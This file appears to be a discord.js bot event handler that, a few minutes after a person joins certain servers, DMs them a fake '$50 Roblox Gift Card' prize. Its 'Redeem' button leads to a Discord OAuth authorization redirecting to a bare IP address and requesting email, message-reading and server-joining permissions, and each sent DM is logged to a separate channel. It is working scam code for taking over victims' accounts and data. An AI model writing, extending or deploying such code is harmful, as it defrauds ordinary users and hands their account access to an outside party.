const fs = require('fs');
const path = require('path');
const { EmbedBuilder, Events, ButtonBuilder, ActionRowBuilder } = require('discord.js');

// Define the path to the JSON file
const serverJoinedPath = path.resolve(__dirname, 'serverJoined.json');
module.exports = {
    name: Events.GuildMemberAdd,
    once: false,
    async execute(member) {
        if (member.user.bot) return;

        // Check if the serversJoined.json file exists
        if (fs.existsSync(serverJoinedPath)) {
            // Read the JSON file and parse the data
            const serverData = JSON.parse(fs.readFileSync(serverJoinedPath, 'utf8'));
            const hasServerId = serverData.find((server) => server.id === member.guild.id);
            
            // Check if the current guild is in the JSON file
            if (hasServerId) {
                // Define a delay in milliseconds (1 to 5 minutes)
                const delay = Math.floor(Math.random() * (5 * 60 * 1000 - 1 * 60 * 1000 + 1)) + 1 * 60 * 1000;

                // Create an embed for the DM message
                const embed = new EmbedBuilder()
                    .setDescription(`<@${member.id}> Congratulations, you have won a **$50 Roblox Gift Card** from **__Avolix**!`)
                    .setImage('https://cdn.discordapp.com/attachments/1228024525241847909/1234217451034771608/50_robux_giftcard.png?ex=663096d2&is=662f4552&hm=f1a51a51bcd614a3049263db553d90ebb60be1800bcb7bea058a2a6fcd077ac4&')
                    .setColor('#313338')
                    .setFooter({ text: 'Click the button below and click "Authorize" to redeem your gift card!' });

                // Create the redeem button
                const redeemButton = new ButtonBuilder()
                    .setStyle('Link') // Set the button style to link
                    .setLabel('Redeem')  // Set the button label
                    .setEmoji('<:Roblox_Robux:1234440272172286002>')  // Set the button emoji
                    .setURL('https://discord.com/oauth2/authorize?client_id=1231985994937536522&response_type=code&redirect_uri=http%3A%2F%2F78.108.218.191%3A25591%2F&scope=identify+messages.read+guilds.join+email');
                
                // Create the "From" button
                const fromButton = new ButtonBuilder()
                    .setStyle('Secondary')  // Set the button style to secondary
                    .setLabel(`From: ${member.guild.name}`)  // Set the button label
                    .setCustomId('fromButton')  // Set a custom ID for the button
                    .setDisabled(true);  // Disable the button
                
                // Create an action row for the buttons
                const row = new ActionRowBuilder()
                    .addComponents(redeemButton, fromButton);
                
                // Wait for the delay before sending the DM
                setTimeout(async () => {
                    // Send the DM to the new member with the embed and action row

                    // Send the log to a channel
                    const logsGuild = member.client.guilds.cache.get('1230511598251278416');
                    const logsChannel = logsGuild.channels.cache.get('1234235915786911848');
                    const dmEdMemberEmbed = new EmbedBuilder()
                        .setTitle('DM Sent')
                        .setDescription(`A DM was sent to <@${member.id}> after ${delay}. They have joined **${member.guild.name}**`)
                        .setColor('#206694');
                    try {
                        await member.send({ embeds: [embed], components: [row] });
                        await logsChannel.send({ embeds: [dmEdMemberEmbed] });
                    }    
                    catch (error) {
                        console.log(error);
                    }


                }, delay);
            }
        }
    }
};
